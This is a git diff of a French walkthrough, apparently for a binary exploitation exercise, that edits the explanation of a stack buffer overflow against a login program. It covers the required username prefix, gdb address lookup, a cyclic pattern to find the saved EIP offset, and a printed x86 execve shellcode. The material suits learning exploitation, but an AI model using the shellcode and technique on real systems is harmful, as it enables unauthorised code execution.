@@ -4,9 +4,9 @@ On commence par recuperer l'executable puis le decompiler, comme avec le premier
 On peut voir que le programme permet a un utilisateur de se connecter.
 Il utilise la fonction `verify_user_name()` et si aucun probleme n'est signale il utilise `verify_user_pass()`.
 
-Pour le username, c'est simple, en regardant la fonction `verify_user_name()`. notre input est compare avec la string "dat_wil" on comprend que notre premier input doit commencer par dat_wil.
+Pour le username, c'est simple, en regardant la fonction `verify_user_name()`. notre input est compare avec la string "dat_wil" on comprend que notre premier input doit commencer par "dat_wil".
 
-Pour le password, la fonction verify_user_pass() verifie que notre input est "admin". Mais on est bloque dans le main:
+Pour le password, la fonction verify_user_pass() nous demande d'avoir un password impossible:
 
 ```
 int32_t eax_2 = verify_user_pass(&buf);
@@ -14,16 +14,17 @@ if (eax_2 && !eax_2)
     return 0;
 ```
 
-c'est impossible, une valeur ne peut pas etre a la fois true et false.
+Avec notre deuxieme input notre strategie va etre d'overwrite l'adresse de return `eip`
+Quand on est dans le scope d'une fonction, on a cette valeur return eip sur la stack,
+elle stocke l'adresse de l'instruction qui suit l'appel de la fonction dans laquelle nous nous trouvons.
+Ainsi quand on termine une fonction on retrouve le fil de l'execution dans la fonction precedente.
 
-Avec notre deuxieme input notre strategie va etre d'overwrite le repertoire `eip`, qui est le repertoire qui stocke l'adresse de retour de la fonction `verify_user_pass()`.
-
-l'objectif est d'executer un shellcode en sortant de `verify_user_pass()`.
+Notre objectif est d'executer un shellcode en sortant de `verify_user_pass()`.
 On va mettre le shellcode a la suite de notre username `dat_will`
 
-notre shellcode : `\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`
+Notre shellcode : `\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`
 
-On commence par trouver les adresses de nos deux input et d'eip avec `ptrace`.
+On commence par trouver les adresses de nos deux input et de return eip.
 
 On utilise `gdb`.
 
@@ -36,7 +37,6 @@ All variables matching regular expression "a_user_name":
 Non-debugging symbols:
 0x0804a040  a_user_name
 ```
-
 
 2 trouver les adresses de eip et de notre deuxieme input
 ```
@@ -54,8 +54,10 @@ Stack level 0, frame at 0xffffd6b0:
 
 saved eip -> 0x8048585
 
-pour identifier ou est-ce qu'on peut overwrite la valeur saved eip, on va donner cet input en deuxime argument, ca va faire segfault le programme et nous aider a trouver quelle partie nous permet d'overflow  
+pour identifier ou est-ce qu'on peut overwrite la valeur d'eip, on va donner cet input en deuxime argument, ca va faire segfault le programme et nous aider a trouver quelle partie nous permet d'overflow.
 `aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuu`
+cette chaine overwrite eip avec une adresse invalide, le programme s'en rend compte quand il cherche a utiliser eip de maniere "standard" et nous affiche une erreur avec l'adresse corompue d'eip.
+On decouvre alors a quel endroit on overwrite eip, on va y mettre la dresse de notre shellcode.
 
 ```
 Program received signal SIGSEGV, Segmentation fault.
